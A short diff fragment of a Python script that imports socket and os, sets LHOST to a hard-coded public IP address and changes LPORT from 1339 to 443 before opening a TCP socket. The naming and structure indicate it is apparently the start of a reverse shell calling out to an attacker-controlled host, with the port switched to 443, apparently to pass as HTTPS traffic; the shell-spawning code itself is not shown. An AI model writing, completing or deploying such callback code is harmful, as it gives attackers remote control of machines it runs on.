@@ -2,7 +2,7 @@ import socket
 import os
 
 LHOST = "144.172.94.84"
-LPORT = 1339
+LPORT = 443
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
